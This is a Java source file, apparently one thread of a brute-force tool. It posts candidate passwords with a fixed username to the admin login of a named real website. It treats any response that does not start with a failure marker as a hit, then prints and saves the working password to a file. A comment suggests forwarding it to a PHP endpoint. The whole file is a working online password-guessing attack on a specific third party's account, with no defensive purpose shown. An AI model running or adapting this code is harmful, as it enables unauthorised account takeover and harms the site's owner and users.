package ws.hoyland.util.ooyear;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.util.*;

import org.apache.http.client.*;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.*;
import org.apache.http.impl.client.*;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.apache.http.*;

public class Poster implements Runnable {

	private String pwd;
	
	public Poster(String pwd){
		this.pwd = pwd;
	}
	@Override
	public void run() {
		// TODO Auto-generated method stub
		HttpClient client = new DefaultHttpClient();
		HttpPost post = new HttpPost("http://www.ooyear.com/admin");

		List<NameValuePair> parms = new ArrayList<NameValuePair>();
		parms.add(new BasicNameValuePair("Password", this.pwd));
		parms.add(new BasicNameValuePair("Username", "saasfun.gl"));
		parms.add(new BasicNameValuePair("code", ""));
		UrlEncodedFormEntity entity;

		try {
			entity = new UrlEncodedFormEntity(parms, "utf-8");
			post.setEntity(entity);
			System.out.println("Executing request: pwd = " + this.pwd);
			HttpResponse response;
			response = client.execute(post);
			HttpEntity entity2 = response.getEntity();
			if (entity != null) {
				//System.out.println("--------------------------------------");
				if(EntityUtils.toString(entity2, "utf-8").startsWith("{\"success\":false")){
					//System.err.println(this.pwd+"->false");
				}else{
					System.err.println(this.pwd+"->true");
					FileWriter fw = new FileWriter("rs.txt");
					BufferedWriter bw = new BufferedWriter(fw);
					bw.write(this.pwd+"->true");
					bw.flush();
					bw.close();
					fw.close();
					//post to php
					
				}
				//System.out.println("Response content: "
				//		+ EntityUtils.toString(entity2, "utf-8"));
				//System.out.println("--------------------------------------");
				//System.out.println(response.getStatusLine());
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			client.getConnectionManager().shutdown();
		}
	}

}
